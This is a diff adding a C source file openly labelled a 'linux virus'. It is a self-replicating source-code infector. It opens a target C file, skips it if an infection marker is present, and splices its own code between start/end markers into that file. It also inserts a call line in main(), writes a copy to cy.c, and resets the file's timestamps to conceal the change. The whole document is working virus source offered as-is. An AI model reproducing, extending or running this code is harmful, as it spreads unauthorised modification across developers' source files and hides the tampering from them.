@@ -1,0 +1,140 @@
+/* linux virus start */
+#include <stdio.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <utime.h>
+
+#define VIRNAME    "test2.c"
+#define BUFSIZE   200
+
+char currentPath[BUFSIZE]="";
+
+int infect(const char *file_name)
+{
+    getcwd(currentPath,BUFSIZE);
+    strcat(currentPath,"/");
+    strcat(currentPath,VIRNAME);
+    printf("currentPath1 = %s\n",currentPath);
+
+    FILE *fp_obj,*fp_vir,*fp_tmp;
+    char buf[BUFSIZE];
+    int flag;
+    char *tmp_buf;
+    struct stat statBuf;
+    struct utimbuf timeBuf;
+
+    if ((fp_obj=fopen(file_name,"r+"))==NULL)
+    {
+        printf("open object file %s failure !!!\n",file_name);
+        return 1;
+    }
+    if (stat(file_name,&statBuf) < 0)
+    {
+        printf("get object file %s stat failure !!\n",file_name);
+        return 1;
+    }
+    timeBuf.actime = statBuf.st_atime;
+    timeBuf.modtime = statBuf.st_mtime;
+    
+    if ((fp_vir=fopen(currentPath,"r"))==NULL)
+    {
+        printf("open virus file %s failure !!\n",currentPath);
+        return 1;
+    }
+
+    if ((tmp_buf=tmpnam(NULL))==NULL)
+    {
+        printf("create temp file failure !!\n");
+        return 1;
+    }
+    if ((fp_tmp=fopen(tmp_buf,"a+"))==NULL)
+    {
+        printf("open temp file failure !!\n");
+        return 1;
+    }
+    unlink(tmp_buf);
+
+    flag = 1;
+    while (fgets(buf,BUFSIZE,fp_obj) != NULL)
+    {
+        if (!strcmp(buf,"/* linux virus start */\n"))
+        {
+            printf("object file %s has been infected !!\n",file_name);
+            return 0;
+        }
+        if (flag == 1 && strstr(buf,"main("))
+        {
+            flag = 0;
+        }
+        if (flag == 0 && (strstr(buf,"return") ||
+                          strstr(buf,"}")))
+        {
+            fputs("\t\tvir_function..\n",fp_tmp);
+            flag = 2;
+        }
+        fputs(buf,fp_tmp);
+    }
+    if (flag != 2)
+    {
+        printf("object don't main function !!\n");
+        return 0;
+    }
+
+    flag = 1;
+    while (fgets(buf,BUFSIZE,fp_vir) != NULL)
+    {
+        if (flag == 1 && !strcmp(buf,"/* linux virus start */\n"))
+        {
+            flag = 0;
+        }
+        if (flag == 1)
+        {
+            continue;
+        }
+        if (flag == 2)
+        {
+            break;
+        }
+        if (!strcmp(buf,"/* linux virus end */\n"))
+        {
+            flag = 2;
+        }
+        if (strstr(buf,"#define VIRNAME") &&
+            buf[0]=='#')
+        {
+            snprintf(buf,sizeof(buf),"%s\t\"%s\"\n",
+                     "#define VIRNAME",file_name);
+        }
+        fputs(buf,fp_tmp);
+    }
+    fclose(fp_vir);
+    FILE *tmp_fp = fopen("cy.c","w+");
+    
+    rewind(fp_tmp);
+    rewind(fp_obj);
+    rewind(tmp_fp);
+
+    while (fgets(buf,BUFSIZE,fp_tmp) != NULL)
+    {
+        fputs(buf,fp_obj);
+        fputs(buf,tmp_fp);
+    }
+    fclose(tmp_fp);
+    fclose(fp_tmp);
+    fclose(fp_obj);
+
+    if (utime(file_name,&timeBuf) < 0)
+    {
+        return 1;
+    }
+    return 0;
+}
+/* linux virus end */
+
+int main(int argc, char **argv)
+{
+    infect(argv[1]);
+    return 0;
+}
